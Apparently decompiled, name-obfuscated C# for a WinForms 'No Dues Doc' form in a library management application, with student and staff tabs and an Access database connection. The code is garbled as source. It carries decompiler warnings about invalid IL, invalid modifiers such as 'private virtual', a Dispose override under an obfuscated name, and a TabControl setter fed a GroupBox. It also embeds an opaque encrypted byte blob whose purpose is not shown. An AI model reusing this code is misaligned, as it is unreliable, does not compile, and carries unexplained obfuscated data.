using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.OleDb;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using n4A;
using x8N;

namespace Hj7k5K;

[DesignerGenerated]
public class Gz1t7F : Form
{
	private IContainer components;

	private TabControl _TabControl1;

	private TabPage _TabPage1;

	private TextBox _txtStatus;

	private Panel _panel1;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[AccessedThroughProperty("btnUpdate_record")]
	private Button _btnUpdate_record;

	[AccessedThroughProperty("NewRecord")]
	private Button _NewRecord;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	private ListView _listView1;

	private ColumnHeader _columnHeader1;

	private ColumnHeader _columnHeader3;

	private GroupBox _GroupBox3;

	private Label _Label4;

	private ComboBox _cmbSession;

	private Label _Label2;

	private Label _Label1;

	private ComboBox _cmbDepartment;

	private ComboBox _cmbCourse;

	private TabPage _TabPage2;

	private TextBox _txtStatus1;

	private Panel _Panel2;

	[AccessedThroughProperty("btnGetData1")]
	private Button _btnGetData1;

	[AccessedThroughProperty("btnUpdate1")]
	private Button _btnUpdate1;

	[AccessedThroughProperty("btnNewRecord1")]
	private Button _btnNewRecord1;

	[AccessedThroughProperty("Button8")]
	private Button _Button8;

	private ListView _ListView2;

	private ColumnHeader _ColumnHeader2;

	private ColumnHeader _ColumnHeader4;

	private GroupBox _GroupBox1;

	private Label _Label6;

	private ComboBox _cmbDepartment1;

	private OleDbDataReader rdr;

	private DataTable dtable;

	private OleDbConnection con;

	private OleDbDataAdapter adp;

	private DataSet ds;

	private OleDbCommand cmd;

	private DataTable dt;

	private string cs;

	internal static Br7 br7_0/* Not supported: data(67 F8 25 4C C4 62 BB 42 06 43 49 89 4F 89 B2 29 1D 96 0D BF 55 63 E9 7F F7 F4 FA E5 28 C5 44 FD 5E 29 CC 7D 58 0A B3 AA 27 F5 BC 8E C5 DB F2 BE BA 42 A2 EB C9 92 01 03 0F A4 53 CE 67 D4 19 3F FD 4A 2A 25 BB 35 CF 12 E2 62 98 5E A6 5A B9 1C 01 3B 2B E4 23 58 34 CB 28 C9 6D B3 B5 E3 43 51 DB 7C 8F 7A B1 CC 03 85 72 8F 08 66 F9 A2 5B B4 EA 37 CC 2B A9 34 1C A5 16 5E FC F1 C6 1C 5C FD 1F 46 81 2A C9 3F 6A 33 38 A5 72 92 4F CC D0 85 6D B8 C7 7D 16 17 A7 A7 5F E9 63 52 CF 10 BD 55 33 0A 47 B3 20 31 E9 AB CC 99 F1 03 C1 88 55 48 8C 77 84 0D 54 DD E6 07 9D D8 C9 DE DA 17 63 28 E6 1C 5F 45 85 1D 64 3B CD 1B B0 7C 24 A3 E4 D5 94 1B C5 57 8A B0 01 54 22 3F 15 47 67 0B D0 B5 36 C9 1C A5 29 0F C1 6F 13 48 3E 38 2D 6A E1 F9 F2 F2 4A BF 51 0B 9C 35 1A 0A 22 46 08 1C D3 C2 49 F9 46 5A 86 3F AC 84 58 55 44 41 71 C7 27 B7 5C 1A 53 74 BF 11 64 2A 2D E5 8A 1E EB 7B 67 F5 74 7A EE 32 23 87 72 B3 45 C5 66 FA C5 5A C3 52 E2 6A E8 EC C8 5F 03 38 95 1B 2C A0 B3 8D 97 DC ED 4E CC F5 D8 F3 94 D4 A7 9F 2E F9 A9 69 64 D1 22 38 3B 81 91 79 2C 15 77 B5 9C 08 5A D1 FE B6 2D 89 0D 77 8D CC 78 ED D5 14 45 29 30 08 8D 2B B6 5A 7D 7B 52 15 4A 73 21 B6 7E 23 56 8B 79 D4 9F 76 CC 20 5C EB 43 54 BE 4D AB 7D 34 03 E3 6F 27 70 51 00 53 82 64 17 3E 98 56 D6 4E 55 96 49 9A 6F 88 B9 3B 6D CE C9 16 28 BB 05 69 CB 3E 1E D1 0E FA E5 3A 78 81 1C 11 B4 E0 C2 95 6C 06 69 B5 62 E2 C3 79 2A 33 B9 A1 86 E9 2A C6 5F AD 71 59 38 04 3F 5A B0 0E 21 ED 6B A7 86 8B 0C 33 A8 22 52 4E 07 E8 79 A3 A6 D9 41 43 B3 8E 56 55 B0 06 6E 68 5D 67 C5 0F 05 53 C1 D5 0D 81 AC 2E 94 53 40 08 73 11 A6 88 DF 93 5C 64 19 6C 5A 91 97 16 F5 80 1C A2 D5 40 5B 43 49 B2 27 A3 95 25 2D 12 AE 60 4E 4E E0 9F 5E E5 88 C9 0A 61 F4 97 F8 30 3E F6 8A 2C 11 F0 7C FE AB 30 C6 F3 61 3B FC 37 37 06 BD F9 42 49 34 56 21) */;

	internal static byte[] byte_0;

	public virtual Button Button3
	{
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = r8D;
			Button button = _Button3;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button3 = value;
			button = _Button3;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public virtual Button btnUpdate_record
	{
		get
		{
			return _btnUpdate_record;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = x3N;
			Button val = _btnUpdate_record;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnUpdate_record = value;
			val = _btnUpdate_record;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	public virtual Button NewRecord
	{
		get
		{
			return _NewRecord;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Qk5;
			Button newRecord = _NewRecord;
			if (newRecord != null)
			{
				((Control)newRecord).remove_Click(eventHandler);
			}
			_NewRecord = value;
			newRecord = _NewRecord;
			if (newRecord != null)
			{
				((Control)newRecord).add_Click(eventHandler);
			}
		}
	}

	public virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = q0C;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public virtual Button btnGetData1
	{
		get
		{
			return _btnGetData1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = s2L;
			Button val = _btnGetData1;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnGetData1 = value;
			val = _btnGetData1;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	public virtual Button btnUpdate1
	{
		get
		{
			return _btnUpdate1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Wp5;
			Button val = _btnUpdate1;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnUpdate1 = value;
			val = _btnUpdate1;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	public virtual Button btnNewRecord1
	{
		get
		{
			return _btnNewRecord1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = m2R;
			Button val = _btnNewRecord1;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnNewRecord1 = value;
			val = _btnNewRecord1;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	public virtual Button Button8
	{
		get
		{
			return _Button8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Bs6;
			Button button = _Button8;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button8 = value;
			button = _Button8;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public Gz1t7F()
	{
		((Form)this).add_Load((EventHandler)Co7);
		rdr = null;
		con = null;
		cmd = null;
		dt = new DataTable();
		cs = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=|DataDirectory|\\LMS_DB.accdb;Persist Security Info=False;";
		Zn2();
	}

	protected override void Wp3d5Q(bool Jy8)
	{
		try
		{
			if (Jy8 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Jy8);
		}
	}

	private void Zn2()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_02d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_043d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0447: Expected O, but got Unknown
		//IL_04c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d0: Expected O, but got Unknown
		//IL_0543: Unknown result type (might be due to invalid IL or missing references)
		//IL_054d: Expected O, but got Unknown
		//IL_05c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ca: Expected O, but got Unknown
		//IL_0675: Unknown result type (might be due to invalid IL or missing references)
		//IL_067f: Expected O, but got Unknown
		//IL_07ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b51: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cca: Expected O, but got Unknown
		//IL_0d49: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d53: Expected O, but got Unknown
		//IL_0dc6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd0: Expected O, but got Unknown
		//IL_0e43: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e4d: Expected O, but got Unknown
		//IL_0ef8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f02: Expected O, but got Unknown
		//IL_0ff7: Unknown result type (might be due to invalid IL or missing references)
		//IL_101b: Unknown result type (might be due to invalid IL or missing references)
		//IL_117f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1189: Expected O, but got Unknown
		//IL_119c: Unknown result type (might be due to invalid IL or missing references)
		//IL_11a6: Expected O, but got Unknown
		//IL_11ab: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Gz1t7F));
		this.Zj9(new TabControl());
		f3M(new TabPage());
		Dg3(new TextBox());
		Kt9(new Panel());
		Button3 = new Button();
		btnUpdate_record = new Button();
		NewRecord = new Button();
		Button2 = new Button();
		Hn9(new ListView());
		j1R(new ColumnHeader());
		i7E(new ColumnHeader());
		Tx0(new GroupBox());
		j9C(new Label());
		z0J(new ComboBox());
		Qx4(new Label());
		z1P(new Label());
		Gi7(new ComboBox());
		b4A(new ComboBox());
		e7P(new TabPage());
		Dx3(new TextBox());
		a9G(new Panel());
		btnGetData1 = new Button();
		btnUpdate1 = new Button();
		btnNewRecord1 = new Button();
		Button8 = new Button();
		Yz3(new ListView());
		c7Z(new ColumnHeader());
		c8Q(new ColumnHeader());
		this.Zj9(new GroupBox());
		Aq6(new Label());
		p0D(new ComboBox());
		((Control)x3B()).SuspendLayout();
		((Control)w8N()).SuspendLayout();
		((Control)Ln4()).SuspendLayout();
		((Control)t5R()).SuspendLayout();
		((Control)w4F()).SuspendLayout();
		((Control)a7H()).SuspendLayout();
		((Control)Rg5()).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)x3B()).get_Controls().Add((Control)(object)w8N());
		((Control)x3B()).get_Controls().Add((Control)(object)w4F());
		((Control)x3B()).set_Location(new Point(-3, 0));
		((Control)x3B()).set_Name("TabControl1");
		x3B().set_SelectedIndex(0);
		((Control)x3B()).set_Size(new Size(913, 668));
		((Control)x3B()).set_TabIndex(0);
		((Control)w8N()).get_Controls().Add((Control)(object)Nz2());
		((Control)w8N()).get_Controls().Add((Control)(object)Ln4());
		((Control)w8N()).get_Controls().Add((Control)(object)Button2);
		((Control)w8N()).get_Controls().Add((Control)(object)r5T());
		((Control)w8N()).get_Controls().Add((Control)(object)t5R());
		w8N().set_Location(new Point(4, 26));
		((Control)w8N()).set_Name("TabPage1");
		((Control)w8N()).set_Padding(new Padding(3));
		((Control)w8N()).set_Size(new Size(905, 638));
		w8N().set_TabIndex(0);
		w8N().set_Text("Students");
		w8N().set_UseVisualStyleBackColor(true);
		((Control)Nz2()).set_Location(new Point(738, 43));
		((Control)Nz2()).set_Name("txtStatus");
		((Control)Nz2()).set_Size(new Size(100, 24));
		((Control)Nz2()).set_TabIndex(68);
		((Control)Nz2()).set_Visible(false);
		((Control)Ln4()).set_Anchor((AnchorStyles)9);
		((Control)Ln4()).set_BackColor(Color.Transparent);
		Ln4().set_BorderStyle((BorderStyle)1);
		((Control)Ln4()).get_Controls().Add((Control)(object)Button3);
		((Control)Ln4()).get_Controls().Add((Control)(object)btnUpdate_record);
		((Control)Ln4()).get_Controls().Add((Control)(object)NewRecord);
		((Control)Ln4()).set_Location(new Point(386, 96));
		((Control)Ln4()).set_Name("panel1");
		((Control)Ln4()).set_Size(new Size(129, 141));
		((Control)Ln4()).set_TabIndex(65);
		((Control)Button3).set_Font(new Font("Palatino Linotype", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button3).set_Location(new Point(16, 92));
		((Control)Button3).set_Name("Button3");
		((Control)Button3).set_Size(new Size(95, 33));
		((Control)Button3).set_TabIndex(4);
		((ButtonBase)Button3).set_Text("&Get Data");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		((Control)btnUpdate_record).set_Enabled(false);
		((Control)btnUpdate_record).set_Font(new Font("Palatino Linotype", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnUpdate_record).set_Location(new Point(16, 53));
		((Control)btnUpdate_record).set_Name("btnUpdate_record");
		((Control)btnUpdate_record).set_Size(new Size(95, 33));
		((Control)btnUpdate_record).set_TabIndex(3);
		((ButtonBase)btnUpdate_record).set_Text("&Update");
		((ButtonBase)btnUpdate_record).set_UseVisualStyleBackColor(true);
		((Control)NewRecord).set_Font(new Font("Palatino Linotype", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)NewRecord).set_Location(new Point(16, 14));
		((Control)NewRecord).set_Name("NewRecord");
		((Control)NewRecord).set_Size(new Size(95, 33));
		((Control)NewRecord).set_TabIndex(0);
		((ButtonBase)NewRecord).set_Text("&New");
		((ButtonBase)NewRecord).set_UseVisualStyleBackColor(true);
		((Control)Button2).set_Font(new Font("Palatino Linotype", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button2).set_Location(new Point(603, 39));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(80, 35));
		((Control)Button2).set_TabIndex(67);
		((ButtonBase)Button2).set_Text("Get List");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		r5T().set_CheckBoxes(true);
		r5T().get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2]
		{
			m1E(),
			m5R()
		});
		((Control)r5T()).set_Font(new Font("Palatino Linotype", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		r5T().set_GridLines(true);
		((Control)r5T()).set_Location(new Point(6, 96));
		((Control)r5T()).set_Name("listView1");
		((Control)r5T()).set_Size(new Size(356, 536));
		((Control)r5T()).set_TabIndex(64);
		r5T().set_UseCompatibleStateImageBehavior(false);
		r5T().set_View((View)1);
		m1E().set_Text("Student ID");
		m1E().set_Width(100);
		m5R().set_Text("Student Name");
		m5R().set_Width(250);
		((Control)t5R()).get_Controls().Add((Control)(object)Qc6());
		((Control)t5R()).get_Controls().Add((Control)(object)Gx3());
		((Control)t5R()).get_Controls().Add((Control)(object)w5P());
		((Control)t5R()).get_Controls().Add((Control)(object)c1Z());
		((Control)t5R()).get_Controls().Add((Control)(object)e3N());
		((Control)t5R()).get_Controls().Add((Control)(object)s9T());
		((Control)t5R()).set_Location(new Point(6, 1));
		((Control)t5R()).set_Margin(new Padding(3, 4, 3, 4));
		((Control)t5R()).set_Name("GroupBox3");
		((Control)t5R()).set_Padding(new Padding(3, 4, 3, 4));
		((Control)t5R()).set_Size(new Size(576, 88));
		((Control)t5R()).set_TabIndex(63);
		t5R().set_TabStop(false);
		Qc6().set_AutoSize(true);
		((Control)Qc6()).set_Location(new Point(18, 21));
		((Control)Qc6()).set_Name("Label4");
		((Control)Qc6()).set_Size(new Size(48, 17));
		((Control)Qc6()).set_TabIndex(7);
		Qc6().set_Text("Session");
		Gx3().set_AutoCompleteMode((AutoCompleteMode)1);
		Gx3().set_AutoCompleteSource((AutoCompleteSource)256);
		((ListControl)Gx3()).set_FormattingEnabled(true);
		((Control)Gx3()).set_Location(new Point(21, 44));
		((Control)Gx3()).set_Name("cmbSession");
		((Control)Gx3()).set_Size(new Size(165, 25));
		((Control)Gx3()).set_TabIndex(6);
		w5P().set_AutoSize(true);
		((Control)w5P()).set_Location(new Point(360, 24));
		((Control)w5P()).set_Name("Label2");
		((Control)w5P()).set_Size(new Size(74, 17));
		((Control)w5P()).set_TabIndex(4);
		w5P().set_Text("Department");
		c1Z().set_AutoSize(true);
		((Control)c1Z()).set_Location(new Point(189, 21));
		((Control)c1Z()).set_Name("Label1");
		((Control)c1Z()).set_Size(new Size(47, 17));
		((Control)c1Z()).set_TabIndex(3);
		c1Z().set_Text("Course");
		e3N().set_AutoCompleteMode((AutoCompleteMode)1);
		e3N().set_AutoCompleteSource((AutoCompleteSource)256);
		((Control)e3N()).set_Enabled(false);
		((ListControl)e3N()).set_FormattingEnabled(true);
		((Control)e3N()).set_Location(new Point(363, 44));
		((Control)e3N()).set_Name("cmbDepartment");
		((Control)e3N()).set_Size(new Size(189, 25));
		((Control)e3N()).set_TabIndex(2);
		s9T().set_AutoCompleteMode((AutoCompleteMode)1);
		s9T().set_AutoCompleteSource((AutoCompleteSource)256);
		((Control)s9T()).set_Enabled(false);
		((ListControl)s9T()).set_FormattingEnabled(true);
		((Control)s9T()).set_Location(new Point(191, 44));
		((Control)s9T()).set_Name("cmbCourse");
		((Control)s9T()).set_Size(new Size(165, 25));
		((Control)s9T()).set_TabIndex(0);
		((Control)w4F()).get_Controls().Add((Control)(object)e3E());
		((Control)w4F()).get_Controls().Add((Control)(object)a7H());
		((Control)w4F()).get_Controls().Add((Control)(object)Button8);
		((Control)w4F()).get_Controls().Add((Control)(object)Jj9());
		((Control)w4F()).get_Controls().Add((Control)(object)Rg5());
		w4F().set_Location(new Point(4, 26));
		((Control)w4F()).set_Name("TabPage2");
		((Control)w4F()).set_Padding(new Padding(3));
		((Control)w4F()).set_Size(new Size(905, 638));
		w4F().set_TabIndex(1);
		w4F().set_Text("Staff");
		w4F().set_UseVisualStyleBackColor(true);
		((Control)e3E()).set_Location(new Point(382, 306));
		((Control)e3E()).set_Name("txtStatus1");
		((Control)e3E()).set_Size(new Size(100, 24));
		((Control)e3E()).set_TabIndex(73);
		((Control)e3E()).set_Visible(false);
		((Control)a7H()).set_Anchor((AnchorStyles)9);
		((Control)a7H()).set_BackColor(Color.Transparent);
		a7H().set_BorderStyle((BorderStyle)1);
		((Control)a7H()).get_Controls().Add((Control)(object)btnGetData1);
		((Control)a7H()).get_Controls().Add((Control)(object)btnUpdate1);
		((Control)a7H()).get_Controls().Add((Control)(object)btnNewRecord1);
		((Control)a7H()).set_Location(new Point(382, 99));
		((Control)a7H()).set_Name("Panel2");
		((Control)a7H()).set_Size(new Size(129, 142));
		((Control)a7H()).set_TabIndex(71);
		((Control)btnGetData1).set_Font(new Font("Palatino Linotype", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnGetData1).set_Location(new Point(16, 92));
		((Control)btnGetData1).set_Name("btnGetData1");
		((Control)btnGetData1).set_Size(new Size(95, 33));
		((Control)btnGetData1).set_TabIndex(4);
		((ButtonBase)btnGetData1).set_Text("&Get Data");
		((ButtonBase)btnGetData1).set_UseVisualStyleBackColor(true);
		((Control)btnUpdate1).set_Enabled(false);
		((Control)btnUpdate1).set_Font(new Font("Palatino Linotype", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnUpdate1).set_Location(new Point(16, 53));
		((Control)btnUpdate1).set_Name("btnUpdate1");
		((Control)btnUpdate1).set_Size(new Size(95, 33));
		((Control)btnUpdate1).set_TabIndex(3);
		((ButtonBase)btnUpdate1).set_Text("&Update");
		((ButtonBase)btnUpdate1).set_UseVisualStyleBackColor(true);
		((Control)btnNewRecord1).set_Font(new Font("Palatino Linotype", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnNewRecord1).set_Location(new Point(16, 14));
		((Control)btnNewRecord1).set_Name("btnNewRecord1");
		((Control)btnNewRecord1).set_Size(new Size(95, 33));
		((Control)btnNewRecord1).set_TabIndex(0);
		((ButtonBase)btnNewRecord1).set_Text("&New");
		((ButtonBase)btnNewRecord1).set_UseVisualStyleBackColor(true);
		((Control)Button8).set_Font(new Font("Palatino Linotype", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button8).set_Location(new Point(287, 40));
		((Control)Button8).set_Name("Button8");
		((Control)Button8).set_Size(new Size(80, 35));
		((Control)Button8).set_TabIndex(72);
		((ButtonBase)Button8).set_Text("Get List");
		((ButtonBase)Button8).set_UseVisualStyleBackColor(true);
		Jj9().set_CheckBoxes(true);
		Jj9().get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2]
		{
			Hd4(),
			k4T()
		});
		((Control)Jj9()).set_Font(new Font("Palatino Linotype", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Jj9().set_GridLines(true);
		((Control)Jj9()).set_Location(new Point(11, 99));
		((Control)Jj9()).set_Name("ListView2");
		((Control)Jj9()).set_Size(new Size(356, 536));
		((Control)Jj9()).set_TabIndex(65);
		Jj9().set_UseCompatibleStateImageBehavior(false);
		Jj9().set_View((View)1);
		Hd4().set_Text("Staff ID");
		Hd4().set_Width(100);
		k4T().set_Text("Staff Name");
		k4T().set_Width(250);
		((Control)Rg5()).get_Controls().Add((Control)(object)x4L());
		((Control)Rg5()).get_Controls().Add((Control)(object)p8F());
		((Control)Rg5()).set_Location(new Point(11, 7));
		((Control)Rg5()).set_Margin(new Padding(3, 4, 3, 4));
		((Control)Rg5()).set_Name("GroupBox1");
		((Control)Rg5()).set_Padding(new Padding(3, 4, 3, 4));
		((Control)Rg5()).set_Size(new Size(262, 88));
		((Control)Rg5()).set_TabIndex(64);
		Rg5().set_TabStop(false);
		x4L().set_AutoSize(true);
		((Control)x4L()).set_Location(new Point(15, 21));
		((Control)x4L()).set_Name("Label6");
		((Control)x4L()).set_Size(new Size(74, 17));
		((Control)x4L()).set_TabIndex(4);
		x4L().set_Text("Department");
		p8F().set_AutoCompleteMode((AutoCompleteMode)1);
		p8F().set_AutoCompleteSource((AutoCompleteSource)256);
		((ListControl)p8F()).set_FormattingEnabled(true);
		((Control)p8F()).set_Location(new Point(18, 43));
		((Control)p8F()).set_Name("cmbDepartment1");
		((Control)p8F()).set_Size(new Size(225, 25));
		((Control)p8F()).set_TabIndex(2);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(7f, 17f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ButtonHighlight);
		((Form)this).set_ClientSize(new Size(906, 668));
		((Control)this).get_Controls().Add((Control)(object)x3B());
		((Control)this).set_Font(new Font("Palatino Linotype", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(3, 4, 3, 4));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("frmNoDues");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("No Dues Doc");
		((Control)x3B()).ResumeLayout(false);
		((Control)w8N()).ResumeLayout(false);
		((Control)w8N()).PerformLayout();
		((Control)Ln4()).ResumeLayout(false);
		((Control)t5R()).ResumeLayout(false);
		((Control)t5R()).PerformLayout();
		((Control)w4F()).ResumeLayout(false);
		((Control)w4F()).PerformLayout();
		((Control)a7H()).ResumeLayout(false);
		((Control)Rg5()).ResumeLayout(false);
		((Control)Rg5()).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual TabControl x3B()
	{
		return _TabControl1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Zj9(TabControl Ks2)
	{
		EventHandler eventHandler = Ly4;
		TabControl tabControl = _TabControl1;
		if (tabControl != null)
		{
			((Control)tabControl).remove_Click(eventHandler);
		}
		_TabControl1 = Ks2;
		tabControl = _TabControl1;
		if (tabControl != null)
		{
			((Control)tabControl).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TabPage w8N()
	{
		return _TabPage1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f3M(TabPage f1C)
	{
		_TabPage1 = f1C;
	}

	[SpecialName]
	private virtual TextBox Nz2()
	{
		return _txtStatus;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void Dg3(TextBox t5W)
	{
		_txtStatus = t5W;
	}

	[SpecialName]
	private virtual Panel Ln4()
	{
		return _panel1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void Kt9(Panel e7H)
	{
		_panel1 = e7H;
	}

	[SpecialName]
	private virtual ListView r5T()
	{
		return _listView1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void Hn9(ListView a5M)
	{
		_listView1 = a5M;
	}

	[SpecialName]
	private virtual ColumnHeader m1E()
	{
		return _columnHeader1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void j1R(ColumnHeader k1R)
	{
		_columnHeader1 = k1R;
	}

	[SpecialName]
	private virtual ColumnHeader m5R()
	{
		return _columnHeader3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void i7E(ColumnHeader x0Q)
	{
		_columnHeader3 = x0Q;
	}

	[SpecialName]
	internal virtual GroupBox t5R()
	{
		return _GroupBox3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Tx0(GroupBox Le3)
	{
		_GroupBox3 = Le3;
	}

	[SpecialName]
	internal virtual Label Qc6()
	{
		return _Label4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j9C(Label a5E)
	{
		_Label4 = a5E;
	}

	[SpecialName]
	internal virtual ComboBox Gx3()
	{
		return _cmbSession;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
